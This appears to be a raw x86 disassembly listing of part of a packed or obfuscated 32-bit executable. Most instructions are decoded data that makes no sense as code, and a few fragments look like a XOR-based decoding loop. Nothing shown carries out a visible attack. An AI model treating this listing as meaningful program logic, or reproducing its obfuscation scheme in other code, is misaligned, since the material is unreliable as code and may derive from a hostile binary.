  407920:	fistp  WORD PTR [ecx]
  407922:	mov    edi,0x5dbfe315
  407927:	in     eax,0xe5
  407929:	sbb    DWORD PTR ds:0x4047fb36,0xffffff89
  407930:	test   DWORD PTR [ecx],ecx
  407932:	add    DWORD PTR [eax],edx
  407934:	xlat   BYTE PTR ds:[ebx]
  407935:	mov    ebx,ecx
  407937:	mov    ds:0x2f5a5c3e,al
  40793c:	push   ss
  40793d:	jbe    0x4078ff
  40793f:	pop    eax
  407940:	adc    DWORD PTR [edx],eax
  407942:	mov    ds:0x820dd466,al
  407947:	xor    al,BYTE PTR [eax+0x73]
  40794a:	sahf   
  40794b:	lock repnz and ebp,DWORD PTR [ebx+0x42fd3f7f]
  407953:	data16 repnz int3 
  407956:	mov    bh,0xe9
  407958:	addr16 enter 0xd250,0xb1
  40795d:	sub    BYTE PTR [ecx+0x704d67d3],bl
  407963:	mov    ds:0xd78da10,eax
  407968:	lock mov ebp,0x1dfb8955
  40796e:	sbb    al,al
  407970:	jns    0x4079c4
  407972:	jnp    0x4079a1
  407974:	cld    
  407975:	cmp    eax,0x5c78e79b
  40797a:	dec    ecx
  40797b:	adc    eax,0xdeb8cf7
  407980:	cmp    eax,0xcabcd1ff
  407985:	cmp    al,0x26
  407987:	dec    ecx
  407988:	or     DWORD PTR ds:0xd2f1bd46,ebp
  40798e:	and    DWORD PTR [edx+0x77],0x565e5a1e
  407995:	push   esi
  407996:	pop    eax
  407997:	or     BYTE PTR [esi-0x5e1de948],0x1b
  40799e:	xlat   BYTE PTR ds:[ebx]
  40799f:	pop    ds
  4079a0:	(bad)  
  4079a1:	retf   
  4079a2:	in     eax,0x4d
  4079a4:	ret    0x424c
  4079a7:	push   cs
  4079a8:	outs   dx,BYTE PTR ds:[esi]
  4079a9:	test   al,0xf9
  4079ab:	cmp    esi,DWORD PTR [edx+eiz*1-0x18b74317]
  4079b2:	pop    eax
  4079b3:	pop    edx
  4079b4:	xchg   edi,eax
  4079b5:	xor    ah,ch
  4079b7:	and    edx,eax
  4079b9:	cmp    eax,0xcb813f0
  4079be:	push   ecx
  4079bf:	data16 aad 0x4f
  4079c2:	fs cld 
  4079c4:	xchg   edx,eax
  4079c5:	ror    DWORD PTR [ebx-0x637edb32],cl
  4079cb:	xchg   ecx,eax
  4079cc:	cmp    ebx,eax
  4079ce:	jecxz  0x4079a1
  4079d0:	imul   esi,DWORD PTR [ecx+0xd],0xe8b58725
  4079d7:	out    0xc7,al
  4079d9:	(bad)  
  4079da:	cwde   
  4079db:	mov    cl,BYTE PTR [ebp-0x508d3a87]
  4079e1:	mov    ds:0x55522f49,eax
  4079e6:	xchg   ebp,eax
  4079e7:	pop    esp
  4079e8:	jle    0x4079d4
  4079ea:	dec    eax
  4079eb:	mov    ah,0x4c
  4079ed:	or     edx,ebx
  4079ef:	push   esi
  4079f0:	pushf  
  4079f1:	mov    ebx,DWORD PTR [ecx-0x52a4ce15]
  4079f7:	in     al,0xc0
  4079f9:	sub    eax,0x2b390210
  4079fe:	jnp    0x4079f1
  407a00:	mov    eax,ds:0xe8bd489
  407a05:	imul   ecx,esi,0x8af20970
  407a0b:	xor    eax,0xdc8a401b
  407a10:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407a11:	pushf  
  407a12:	sbb    BYTE PTR [edi-0x64],dh
  407a15:	cli    
  407a16:	pop    eax
  407a17:	jle    0x407a3a
  407a19:	jne    0x4079b6
  407a1b:	push   eax
  407a1c:	ja     0x407a0b
  407a1e:	fdiv   DWORD PTR [eax+0x39]
  407a21:	or     al,0xbe
  407a23:	adc    BYTE PTR [ebp-0x52],0x49
  407a27:	fstp   st(5)
  407a29:	fcom   st(5)
  407a2b:	inc    esi
  407a2c:	outs   dx,BYTE PTR ds:[esi]
  407a2d:	repz fild DWORD PTR [ebx-0x4]
  407a31:	mov    ecx,0x474608f1
  407a36:	das    
  407a37:	stc    
  407a38:	xchg   BYTE PTR [ebp-0x2fe59ec3],ah
  407a3e:	xchg   esp,eax
  407a3f:	mov    al,ds:0xb80399c0
  407a44:	xchg   esp,eax
  407a45:	daa    
  407a46:	mov    ebp,0x7082c8b5
  407a4b:	and    dh,BYTE PTR [ecx-0x3f]
  407a4e:	push   ebp
  407a4f:	cmp    DWORD PTR [esi+edi*2-0x690dbb9a],0xb4f2083f
  407a5a:	add    ebx,DWORD PTR [edx+0x22dcd9ed]
  407a60:	xlat   BYTE PTR ds:[ebx]
  407a61:	pop    edx
  407a62:	repnz or eax,0xfa84204f
  407a68:	into   
  407a69:	mov    BYTE PTR [eax-0x63a3e285],ah
  407a6f:	shl    ah,cl
  407a71:	jnp    0x407ad7
  407a73:	lock (bad) [edi-0x4cdf59c8]
  407a7a:	outs   dx,DWORD PTR ds:[esi]
  407a7b:	push   ds
  407a7c:	neg    BYTE PTR [edi+0x3c]
  407a7f:	ins    DWORD PTR es:[edi],dx
  407a80:	popf   
  407a81:	add    al,0x4f
  407a83:	inc    edi
  407a84:	repz popa 
  407a86:	and    bh,ah
  407a88:	push   es
  407a89:	mov    ds:0x30ee11b5,al
  407a8e:	jno    0x407ae6
  407a90:	sti    
  407a91:	int3   
  407a92:	mov    edi,0x54f63b34
  407a97:	mov    cl,0xcf
  407a99:	add    BYTE PTR gs:[esi-0x5e1ed170],bl
  407aa0:	xchg   edi,eax
  407aa1:	ret    0x12d6
  407aa4:	(bad)  
  407aa5:	popa   
  407aa6:	mov    cl,dh
  407aa8:	jo     0x407b00
  407aaa:	mov    eax,ds:0x8e268d9b
  407aaf:	or     BYTE PTR [edx-0x56abaf9e],dh
  407ab5:	push   edx
  407ab6:	cmp    dh,bh
  407ab8:	fsub   QWORD PTR [edx]
  407aba:	xor    BYTE PTR [edi+0x4c],bl
  407abd:	je     0x407abc
  407abf:	jnp    0x407afb
  407ac1:	inc    edi
  407ac2:	sub    esp,DWORD PTR [edi-0x6c679044]
  407ac8:	jns    0x407a4e
  407aca:	(bad)  
  407acb:	sbb    eax,0xf5389772
  407ad0:	cmp    ah,BYTE PTR [ebp+0x4c5af1ba]
  407ad6:	mov    esi,0xd735e0a7
  407adb:	dec    ecx
  407adc:	inc    edi
  407add:	xor    ebx,edx
  407adf:	pop    ebp
  407ae0:	loop   0x407a67
  407ae2:	push   eax
  407ae3:	add    BYTE PTR [ecx+ebx*8-0x62],dl
  407ae7:	addr16 mov ebp,0xf28af967
  407aed:	mov    ecx,0xa2421def
  407af2:	dec    edx
  407af3:	aam    0xe4
  407af5:	inc    edx
  407af6:	test   esi,ebx
  407af8:	jb     0x407a96
  407afa:	mov    eax,DWORD PTR [di-0x10]
  407afe:	xor    DWORD PTR [eax],0x2650fa8c
  407b04:	jmp    0x4072df
  407b09:	mov    ax,WORD PTR [ebp-0x4]
  407b0d:	mov    edi,DWORD PTR [ebp+0x8]
  407b10:	mov    edi,DWORD PTR [edi]
  407b12:	mov    edx,0x8a38
  407b17:	xor    ax,dx
  407b1a:	mov    edx,0x3afe
  407b1f:	add    ax,dx
  407b22:	jmp    0x407f10
  407b27:	int    0x82
  407b29:	adc    al,0x54
  407b2b:	push   ebp
  407b2c:	pop    esp
  407b2d:	dec    ebp
  407b2e:	xchg   ebx,eax
  407b2f:	leave  
  407b30:	mul    BYTE PTR [ebx-0x4e]
  407b33:	sar    cl,1
  407b35:	push   ss
  407b36:	aas    
  407b37:	pop    ecx
  407b38:	(bad)  
  407b39:	jle    0x407bb9
  407b3b:	dec    edi
  407b3c:	jns    0x407bbc
  407b3e:	jle    0x407b67
  407b40:	pop    ebx
  407b41:	call   0x227:0xfff7aede
  407b48:	mov    BYTE PTR [esi],dh
  407b4a:	inc    edx
  407b4b:	jb     0x407ad0
  407b4d:	ja     0x407b97
  407b4f:	shl    DWORD PTR [ecx],1
  407b51:	adc    ch,ch
  407b53:	jmp    0x7b5f3e97
  407b58:	xor    al,0xb
  407b5a:	sbb    bh,cl
  407b5c:	push   eax
  407b5d:	jo     0x407b28
  407b5f:	cmp    eax,0xd49ae343
  407b64:	test   eax,0x6938b5fe
  407b69:	push   edi
  407b6a:	or     dl,bl
  407b6c:	mov    WORD PTR [ecx+ebx*8-0x3],ds
  407b70:	lods   al,BYTE PTR ds:[esi]
  407b71:	mov    ds:0x9eaafb0e,al
  407b76:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407b77:	xchg   DWORD PTR [esi+0x19a05a4f],edx
  407b7d:	or     edi,esp
  407b7f:	cmp    BYTE PTR [edx-0x4016cef],dh
  407b85:	outs   dx,DWORD PTR ds:[esi]
  407b86:	mov    eax,DWORD PTR [edx+edi*2-0x729063a7]
  407b8d:	test   al,0xcd
  407b8f:	mov    esi,0xb3f386a1
  407b94:	outs   dx,DWORD PTR ds:[esi]
  407b95:	sub    eax,edx
  407b97:	arpl   WORD PTR [edx+0xf],di
  407b9a:	iret   
  407b9b:	bound  esi,QWORD PTR [eax-0x35bf3148]
  407ba1:	mov    DWORD PTR [edi-0x45e2819c],ebp
  407ba7:	pop    edi
  407ba8:	sbb    al,0x80
  407baa:	xor    DWORD PTR [edi],esp
  407bac:	out    dx,eax
  407bad:	fimul  DWORD PTR [edi+0x300b93ea]
  407bb3:	test   esp,0x59ad7253
  407bb9:	std    
  407bba:	push   edi
  407bbb:	mov    esi,0xd97988e1
  407bc0:	in     al,0xe4
  407bc2:	mov    esp,0x7afc4d53
  407bc7:	add    al,BYTE PTR [ebx]
  407bc9:	mov    bl,0x5f
  407bcb:	imul   esi,edx,0xf
  407bce:	(bad)  
  407bd0:	mov    ch,0x21
  407bd2:	out    dx,eax
  407bd3:	outs   dx,DWORD PTR ds:[esi]
  407bd4:	pop    ds
  407bd5:	jb     0x407bde
  407bd7:	(bad)  
  407bd8:	fisub  DWORD PTR [edi]
  407bda:	push   ebp
  407bdb:	cmc    
  407bdc:	push   edi
  407bdd:	loopne 0x407be7
  407bdf:	inc    ebx
  407be0:	jle    0x407bd5
  407be2:	loope  0x407bd7
  407be4:	sbb    esp,DWORD PTR [edi-0x283ba986]
  407bea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407beb:	jle    0x407c36
  407bed:	bound  edx,QWORD PTR [ecx+0x2]
  407bf0:	lea    ecx,ss:[esi+0x6730541]
  407bf7:	je     0x407beb
  407bf9:	push   ss
  407bfa:	and    BYTE PTR ds:0xac72b292,cl
  407c00:	(bad)  
  407c01:	ss sbb eax,0xd0772a81
  407c07:	lahf   
  407c08:	repz mov ?,WORD PTR [ebx+0x53f18aee]
  407c0f:	sub    bl,bh
  407c11:	rcl    DWORD PTR [edi+eax*4-0x263185fa],0x11
  407c19:	loop   0x407bf6
  407c1b:	jg     0x407b9f
  407c1d:	and    esp,DWORD PTR ds:0x631a50ff
  407c23:	or     esp,esp
  407c25:	and    eax,0xddd8cc8d
  407c2a:	ret    
  407c2b:	cdq    
  407c2c:	inc    di
  407c2e:	dec    edi
  407c2f:	or     al,0x5f
  407c31:	out    0xe5,eax
  407c33:	jle    0x407c86
  407c35:	daa    
  407c36:	mov    al,ds:0x3e838255
  407c3b:	outs   dx,DWORD PTR ds:[esi]
  407c3c:	pop    ss
  407c3d:	or     cl,0x88
  407c40:	out    0x80,eax
  407c42:	lahf   
  407c43:	fisubr WORD PTR [ecx-0x15]
  407c46:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407c47:	add    dh,bl
  407c49:	xchg   edx,eax
  407c4a:	(bad)  [edi+0x51]
  407c4d:	mov    ah,0x3a
  407c4f:	or     BYTE PTR [edi-0x15b34ca2],al
  407c55:	in     al,dx
  407c56:	pop    eax
  407c57:	push   edx
  407c58:	retf   
  407c59:	or     eax,0xc6286ab3
  407c5e:	stos   BYTE PTR es:[edi],al
  407c5f:	or     ecx,DWORD PTR [ebp-0x60]
  407c62:	outs   dx,BYTE PTR ds:[esi]
  407c63:	aad    0xe3
  407c65:	push   ds
  407c66:	pop    ss
  407c67:	add    eax,0xe4a259f5
  407c6c:	ret    0xd806
  407c6f:	push   ds
  407c70:	fucomip st,st(0)
  407c72:	test   DWORD PTR [edx+ebp*2-0x78],0x848bc5ff
  407c7a:	mov    edi,0xad3cdc01
  407c7f:	(bad)  
  407c80:	aaa    
  407c81:	nop
  407c82:	cmp    BYTE PTR [eax+0x36d96ad0],0x50
  407c89:	sub    al,0x71
  407c8b:	mov    al,ds:0xc9ad37bc
  407c90:	mov    ecx,ebx
  407c92:	mov    ds:0x3b9c12d9,al
  407c97:	and    DWORD PTR [ebx-0x42],edx
  407c9a:	inc    esp
  407c9b:	fisub  DWORD PTR [esi+0x67]
  407c9e:	aam    0xb9
  407ca0:	cmp    ah,cl
  407ca2:	mov    eax,ds:0x86a380b9
  407ca7:	mov    fs,WORD PTR [edi]
  407ca9:	dec    edx
  407caa:	and    dl,BYTE PTR [esi+ebp*1-0x744b50c4]
  407cb1:	adc    cl,BYTE PTR [eax-0x62ca70a2]
  407cb7:	pop    ds
  407cb8:	outs   dx,DWORD PTR ds:[esi]
  407cb9:	cli    
  407cba:	inc    eax
  407cbb:	and    eax,0xbb855e8a
  407cc0:	push   ebx
  407cc1:	ds aam 0x4b
  407cc4:	lds    ecx,FWORD PTR [ebx-0x61313667]
  407cca:	push   ebp
  407ccb:	dec    edx
  407ccc:	jmp    0x407ca2
  407cce:	jmp    0xd101:0x365bd4ce
  407cd5:	dec    edx
  407cd6:	scas   al,BYTE PTR es:[edi]
  407cd7:	out    dx,eax
  407cd8:	xor    al,0x9f
  407cda:	test   eax,0x7c5d7b75
  407cdf:	pop    ss
  407ce0:	sub    al,0x35
  407ce2:	xchg   edi,eax
  407ce3:	cmp    al,0x93
  407ce5:	jecxz  0x407cba
  407ce7:	xlat   BYTE PTR ds:[ebx]
  407ce8:	lock jl 0x407d5c
  407ceb:	mov    cl,0x12
  407ced:	push   ebx
  407cee:	jbe    0x407c79
  407cf0:	movd   DWORD PTR [edi],mm7
  407cf3:	sti    
  407cf4:	dec    edx
  407cf5:	mul    BYTE PTR [ecx-0x5f]
  407cf8:	fstp   DWORD PTR [eax+0x5f]
  407cfb:	fild   WORD PTR [eax+ebp*1-0x6f]
  407cff:	rcl    DWORD PTR [eax+0x6e],0xe0
  407d03:	add    BYTE PTR [edi+edx*4-0x15],0x4
  407d08:	inc    esp
  407d09:	sbb    eax,0x49183ae6
  407d0e:	mov    ds,WORD PTR [esi+0x3e]
  407d11:	xchg   ebx,eax
  407d12:	sbb    DWORD PTR [edx+0x14],esi
  407d15:	test   al,0x40
  407d17:	pushf  
  407d18:	pop    ebp
  407d19:	mov    cl,0xbd
  407d1b:	push   esi
  407d1c:	loope  0x407d25
  407d1e:	pop    ebp
  407d1f:	jnp    0x407cd9
  407d21:	pushf  
  407d22:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407d23:	jb     0x407d93
  407d25:	test   ebp,edi
  407d27:	ins    BYTE PTR es:[edi],dx
  407d28:	or     ah,bh
  407d2a:	inc    ebp
  407d2b:	cmp    bl,0xbd
  407d2e:	pushf  
  407d2f:	mov    WORD PTR [ebx+0x75832057],?
  407d35:	adc    eax,0xb5e2142c
  407d3a:	pop    eax
  407d3b:	repnz xchg edx,eax
  407d3d:	out    0xaa,al
  407d3f:	addr16 pushf 
  407d41:	(bad)  
  407d42:	xchg   ecx,eax
  407d43:	push   ds
  407d44:	dec    esi
  407d45:	sbb    edx,esi
  407d47:	fs dec edx
  407d49:	push   ss
  407d4a:	mov    es,WORD PTR [ecx+0x2c247ec8]
  407d50:	arpl   WORD PTR [ecx+eax*8+0x341ae4f4],cx
  407d57:	xchg   ecx,eax
  407d58:	mov    al,ds:0xb69156bd
  407d5d:	mov    al,ds:0x3537c7f4
  407d62:	cmp    BYTE PTR [edi+0x4],ch
  407d65:	aam    0x5
  407d67:	or     esi,DWORD PTR [ebx-0x6e]
  407d6a:	xchg   edx,eax
  407d6b:	push   0xffffff93
  407d6d:	xchg   BYTE PTR [ebp-0x7b16e7df],cl
  407d73:	loope  0x407dde
  407d75:	or     eax,0x4d59668d
  407d7a:	add    dh,BYTE PTR [ecx+0x7b5ab2]
  407d80:	arpl   WORD PTR fs:[ebp-0x30f61ec8],ax
  407d87:	cs push edx
  407d89:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407d8a:	pop    es
  407d8b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407d8c:	shl    DWORD PTR [esi+0x2f582bdb],0x1c
  407d93:	xchg   ebx,eax
  407d94:	sbb    eax,0x8863cae6
  407d99:	les    edi,FWORD PTR [ecx]
  407d9b:	js     0x407d5c
  407d9d:	ins    BYTE PTR es:[edi],dx
  407d9e:	std    
  407d9f:	inc    edi
  407da0:	dec    ecx
  407da1:	loope  0x407d23
  407da3:	ins    BYTE PTR es:[edi],dx
  407da4:	fistp  DWORD PTR [ebx+0x3a]
  407da7:	call   0x9bf9:0x840f2403
  407dae:	inc    esi
  407daf:	or     BYTE PTR [eax-0x628e3261],0x51
  407db6:	push   ebp
  407db7:	dec    ecx
  407db8:	xchg   ebp,eax
  407db9:	xchg   DWORD PTR [ecx-0x6b27c8c2],ebp
  407dbf:	add    al,0xa7
  407dc1:	adc    bl,ah
  407dc3:	in     al,dx
  407dc4:	jb     0x407d53
  407dc6:	in     al,0xa4
  407dc8:	cmp    ax,0xbf5b
  407dcc:	push   esp
  407dcd:	lods   eax,DWORD PTR ds:[esi]
  407dce:	ret    0x7378
  407dd1:	sahf   
  407dd2:	lds    eax,FWORD PTR [edx-0x6e7ff703]
  407dd8:	ds jecxz 0x407e43
  407ddb:	outs   dx,DWORD PTR ds:[esi]
  407ddc:	sub    eax,0x420fc96c
  407de1:	xchg   ebx,eax
  407de2:	push   ds
  407de3:	push   esp
  407de4:	imul   edx,DWORD PTR [ebp-0x57],0x68b49bb
  407deb:	push   eax
  407dec:	sti    
  407ded:	and    BYTE PTR [esi+eax*1-0x4a],0xe7
  407df2:	dec    eax
  407df3:	hlt    
  407df4:	fmul   QWORD PTR [ebp-0x52]
  407df7:	dec    eax
  407df8:	out    dx,eax
  407df9:	stc    
  407dfa:	sbb    eax,0x2bec8fde
  407dff:	dec    esp
  407e00:	(bad)  
  407e01:	sbb    bl,BYTE PTR [ecx+0x67]
  407e04:	inc    ecx
  407e05:	push   eax
  407e06:	push   ds
  407e07:	mov    ebx,0x19401640
  407e0c:	ficom  WORD PTR [edi]
  407e0e:	leave  
  407e0f:	fiadd  DWORD PTR [eax]
  407e11:	adc    ecx,ebp
  407e13:	cmc    
  407e14:	repz daa 
  407e16:	cmp    esi,ebp
  407e18:	and    al,0x61
  407e1a:	pop    eax
  407e1b:	sub    edi,DWORD PTR [ebx]
  407e1d:	aas    
  407e1e:	test   al,0xca
  407e20:	mov    bh,0x2c
  407e22:	call   0x1dcc:0xfb355fe1
  407e29:	in     eax,0xd8
  407e2b:	mov    ah,0xd4
  407e2d:	sbb    eax,0x2c9b418a
  407e32:	pop    eax
  407e33:	das    
  407e34:	jl     0x407dca
  407e36:	loop   0x407dc4
  407e38:	adc    bl,0xf4
  407e3b:	pop    ebp
  407e3c:	mov    esi,0x5e26a4a3
  407e41:	jecxz  0x407e0a
  407e43:	aas    
  407e44:	xlat   BYTE PTR ds:[ebx]
  407e45:	dec    esp
  407e46:	shl    BYTE PTR ds:0x215d036f,0x7
  407e4d:	fwait
  407e4e:	daa    
  407e4f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407e50:	sub    DWORD PTR [edi+0x73],ebp
  407e53:	clc    
  407e54:	sbb    BYTE PTR [edi],al
  407e56:	mov    ecx,DWORD PTR [edx]
  407e58:	pop    esp
  407e59:	and    ecx,eax
  407e5b:	arpl   di,ax
  407e5d:	sub    bh,BYTE PTR ds:0xfcf2a70b
  407e63:	std    
  407e64:	ficomp DWORD PTR [esi-0x3ad9f98a]
  407e6a:	mov    bl,0xa4
  407e6c:	popf   
  407e6d:	test   al,0x2
  407e6f:	imul   edx,DWORD PTR [esi-0x6250e120],0x6e
  407e76:	jle    0x407dff
  407e78:	ds and eax,0x3695855f
  407e7e:	fisub  WORD PTR [eax-0x78]
  407e81:	jp     0x407e52
  407e83:	inc    ecx
  407e84:	cmp    ebp,DWORD PTR [edi+eiz*8-0x1249628e]
  407e8b:	mov    al,ds:0xb18cc1fd
  407e90:	shr    DWORD PTR [eax-0x6a],0xf4
  407e94:	nop
  407e95:	(bad)  
  407e96:	xor    ebx,edi
  407e98:	add    eax,eax
  407e9a:	dec    edx
  407e9b:	mov    ebp,0x6e37e097
  407ea0:	jbe    0x407f06
  407ea2:	xor    al,0xef
  407ea4:	adc    BYTE PTR [ecx],ch
  407ea6:	hlt    
  407ea7:	mov    bh,0x98
  407ea9:	(bad)  [esi]
  407eab:	and    al,0xcb
  407ead:	leave  
  407eae:	xchg   esi,eax
  407eaf:	mov    ds,WORD PTR [eax+0x62]
  407eb2:	sti    
  407eb3:	dec    esi
  407eb4:	mov    ch,0x8c
  407eb6:	jae    0x407e73
  407eb8:	imul   ecx,DWORD PTR [ebp+0x58],0x6d54a61
  407ebf:	fmul   DWORD PTR [ebx-0x3a442a97]
  407ec5:	cmp    al,0x14
  407ec7:	call   0x63c55771
  407ecc:	adc    dh,ah
  407ece:	or     eax,0x2418348d
  407ed3:	add    eax,0x1f422865
  407ed8:	pop    ds
  407ed9:	xchg   DWORD PTR [ebp-0x3d934ce0],esi
  407edf:	jmp    0x73d5:0x2e13eb91
  407ee6:	xchg   esi,eax
  407ee7:	push   ds
  407ee8:	fs add al,0x13
  407eeb:	inc    eax
  407eec:	mov    eax,0x265a0c46
  407ef1:	mov    ?,esi
  407ef3:	es sahf 
  407ef5:	cld    
  407ef6:	mov    fs,WORD PTR [ecx-0x6bfcb445]
  407efc:	xchg   esp,eax
  407efd:	pop    ebx
  407efe:	ins    DWORD PTR es:[edi],dx
  407eff:	loopne 0x407f1b
  407f01:	push   esi
  407f02:	dec    ebp
  407f03:	xchg   edi,eax
  407f04:	or     al,0x77
  407f06:	mov    ah,0x63
  407f08:	jb     0x407e8b
  407f0a:	push   ss
  407f0b:	xlat   BYTE PTR ds:[ebx]
  407f0c:	inc    ebp
  407f0d:	push   ecx
  407f0e:	mov    ecx,0x73b66da
  407f13:	je     0x407f60
  407f19:	mov    eax,DWORD PTR [ebp-0x14]
  407f1c:	xor    eax,ecx
  407f1e:	add    eax,esi
  407f20:	mov    DWORD PTR [ebp-0x24],eax
  407f23:	mov    eax,DWORD PTR [ebp-0x28]
  407f26:	mov    di,WORD PTR [ebp-0x2c]
  407f2a:	mov    ebx,0x8a38
  407f2f:	xor    di,bx
  407f32:	add    di,dx
  407f35:	movzx  edx,di
  407f38:	mov    edi,DWORD PTR [ebp-0x8]
  407f3b:	xor    edi,ecx
  407f3d:	lea    edx,[edx+edi*1+0x327299]
  407f44:	add    DWORD PTR [eax],edx
  407f46:	mov    eax,DWORD PTR [ebp-0x20]
  407f49:	mov    edx,DWORD PTR [ebp-0x8]
  407f4c:	mov    edi,DWORD PTR [ebp-0x24]
  407f4f:	xor    edx,ecx
  407f51:	add    edx,esi
  407f53:	imul   edx,edi
  407f56:	sub    DWORD PTR [eax],edx
  407f58:	mov    eax,DWORD PTR [ebp-0x14]
  407f5b:	jmp    0x4072e2
  407f60:	mov    eax,DWORD PTR [ebp-0xc]
  407f63:	mov    edx,DWORD PTR [ebp-0x18]
  407f66:	jmp    0x408354
  407f6b:	fadd   st,st(0)
  407f6d:	test   eax,0x6177b1f6
  407f72:	ror    BYTE PTR [ebx],1
  407f74:	ins    DWORD PTR es:[edi],dx
  407f75:	pop    eax
  407f76:	jl     0x407fbc
  407f78:	push   cs
  407f79:	bound  esp,QWORD PTR [edx+ebp*4-0x2e]
  407f7d:	jle    0x407ffd
  407f7f:	dec    edi
  407f80:	jns    0x408000
  407f82:	jle    0x407fea
  407f84:	test   ah,al
  407f86:	out    0x5d,al
  407f88:	mov    ebp,0x488699b7
  407f8d:	inc    esi
  407f8e:	loop   0x407fdb
  407f90:	cmp    eax,0xc159fb13
  407f95:	test   eax,0xb49e71a6
  407f9a:	loopne 0x407fc4
  407f9c:	mov    ch,0x8e
  407f9e:	adc    eax,0xdeb54727
  407fa3:	add    DWORD PTR ds:[ecx+0xf],esi
  407fa7:	in     al,dx
  407fa8:	loop   0x407f96
  407faa:	gs gs push cs
  407fad:	add    edx,DWORD PTR [ebx+0x4f229206]
  407fb3:	jbe    0x407f92
  407fb5:	(bad)  
  407fb6:	aas    
  407fb7:	shufps xmm2,XMMWORD PTR [esi],0xce
  407fbb:	pop    ebp
  407fbc:	inc    esp
  407fbd:	add    al,0xf2
  407fbf:	ud0    ebx,DWORD PTR [eax+0x71]
  407fc3:	sbb    DWORD PTR [ecx+0x5c],0xffffffcc
  407fc7:	sar    DWORD PTR [ecx-0x25815f3b],cl
  407fcd:	ret    0x5c75
  407fd0:	adc    ebx,DWORD PTR [ecx]
  407fd2:	mov    ebx,0xb5687cca
  407fd7:	jno    0x407fa2
  407fd9:	or     BYTE PTR [eax+0x7a1c2921],ch
  407fdf:	pop    ds
  407fe0:	xor    BYTE PTR [edi+0x2300ab19],ah
  407fe6:	outs   dx,DWORD PTR ds:[esi]
  407fe7:	lahf   
  407fe8:	lods   al,BYTE PTR ds:[esi]
  407fe9:	inc    ebx
  407fea:	fs inc ecx
  407fec:	dec    esp
  407fed:	dec    edx
  407fee:	dec    esp
  407fef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407ff0:	push   esi
  407ff1:	or     bh,BYTE PTR [ebp-0x37]
  407ff4:	xchg   edi,eax
  407ff5:	lahf   
  407ff6:	inc    edx
  407ff7:	pop    ebx
  407ff8:	iret   
  407ff9:	adc    eax,0x384d47e6
  407ffe:	inc    esp
  407fff:	test   BYTE PTR [ecx],bh
  408001:	jg     0x407fcb
  408003:	xchg   ebp,eax
  408004:	cmp    dh,BYTE PTR [esi+eiz*1]
  408007:	and    DWORD PTR [esi+0x3e],edi
  40800a:	mov    ds:0x4d520e4d,eax
  40800f:	sbb    BYTE PTR gs:[esi],0x18
  408013:	xlat   BYTE PTR ds:[ebx]
  408014:	in     eax,0x10
  408016:	out    0xeb,al
  408018:	(bad)  
  408019:	jne    0x407fe2
  40801b:	js     0x408066
  40801d:	int    0xf3
  40801f:	cmp    BYTE PTR [eax-0x3ac17366],bh
  408025:	je     0x407fa9
  408027:	cwde   
  408028:	sub    BYTE PTR [eax-0x57],bl
  40802b:	in     eax,0xca
  40802d:	clc    
  40802e:	mov    ebx,0x41bf609f
  408033:	push   cs
  408034:	xor    eax,0x4736e9d5
  408039:	(bad)  
  40803a:	mov    bh,0x59
  40803c:	xor    BYTE PTR [ebx+0x3dcf06b6],ah
  408042:	and    BYTE PTR [ecx+0x3b],bl
  408045:	dec    ebx
  408046:	fsubr  st(6),st
  408048:	and    ch,BYTE PTR [edi]
  40804a:	fmul   DWORD PTR [ebp+0x4e178bf8]
  408050:	dec    ebx
  408051:	adc    BYTE PTR [esi+0x59],bh
  408054:	retf   
  408055:	mov    ds:0x371d1d35,al
  40805a:	sbb    DWORD PTR [edi-0x5c14cd09],0xffffffc6
  408061:	lea    eax,[esi]
  408063:	(bad)  
  408064:	scas   al,BYTE PTR es:[edi]
  408065:	cmp    BYTE PTR [edi+0x7c],0x69
  408069:	cmp    eax,0x6a40ea79
  40806e:	cmc    
  40806f:	sub    ebx,DWORD PTR [edi+esi*2+0x370b5935]
  408076:	sbb    al,0x57
  408078:	pop    edx
  408079:	push   esi
  40807a:	cmp    DWORD PTR [esi],esp
  40807c:	mov    dl,0xaa
  40807e:	mov    ebx,0x5be66b4f
  408083:	push   0x16b0edeb
  408088:	pop    edx
  408089:	or     eax,0xb2a5f545
  40808e:	mov    ebx,0x80bf804e
  408093:	mov    eax,ds:0xe2200493
  408098:	ins    BYTE PTR es:[edi],dx
  408099:	shr    DWORD PTR [esi],cl
  40809b:	pop    eax
  40809c:	mov    al,ds:0x6df38625
  4080a1:	jp     0x4080c2
  4080a3:	jl     0x40804c
  4080a5:	shr    bl,1
  4080a7:	lea    ebx,[ebx]
  4080a9:	xchg   esp,eax
  4080aa:	and    al,0x9d
  4080ac:	push   edx
  4080ad:	dec    edx
  4080ae:	aam    0x6
  4080b0:	iret   
  4080b1:	leave  
  4080b2:	mov    al,0x51
  4080b4:	int3   
  4080b5:	imul   al
  4080b7:	sub    BYTE PTR [eax],bh
  4080b9:	out    dx,al
  4080ba:	fstp   DWORD PTR [edx-0x288d97c2]
  4080c0:	popa   
  4080c1:	dec    edx
  4080c2:	jno    0x4080a1
  4080c4:	jno    0x408080
  4080c6:	and    DWORD PTR [esi-0x6d],esi
  4080c9:	adc    al,0x90
  4080cb:	add    al,0x4b
  4080cd:	nop
  4080ce:	mov    edi,0x82b4e9f6
  4080d3:	mov    eax,0xfaaba1fe
  4080d8:	imul   edi,DWORD PTR [edi],0xee27907a
  4080de:	jne    0x40813b
  4080e0:	in     al,0x9c
  4080e2:	inc    esi
  4080e3:	test   edi,edx
  4080e5:	test   eax,0xbfa84daa
  4080ea:	sbb    al,0xbb
  4080ec:	fdivr  DWORD PTR [esi]
  4080ee:	or     ax,0xb4f7
  4080f2:	jns    0x408102
  4080f4:	inc    esi
  4080f5:	sub    dh,BYTE PTR [eax-0x1f]
  4080f8:	jmp    0x94f3:0xe7aac97c
  4080ff:	lods   eax,DWORD PTR ds:[esi]
  408100:	dec    edi
  408101:	jmp    DWORD PTR [ebx+ebx*2]
  408104:	pusha  
  408105:	ffree  st(1)
  408107:	(bad)  
  408108:	loope  0x408105
  40810a:	push   esp
  40810b:	add    al,0x49
  40810d:	add    DWORD PTR [ecx+0x4e],edx
  408110:	push   ebp
